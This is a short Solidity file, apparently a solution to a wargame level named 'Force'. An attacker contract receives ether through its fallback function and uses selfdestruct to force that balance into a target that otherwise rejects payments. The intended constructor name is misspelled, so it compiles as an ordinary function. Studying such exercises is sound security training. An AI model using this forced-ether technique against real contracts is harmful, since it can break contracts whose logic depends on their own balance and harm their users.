pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceAttack {
    uint public a;
    
    function FoceAttack() payable {}
    
    function() payable {
        a = 3;
    }
    
    function attact(address target){
        selfdestruct(target); //suicide
    }
}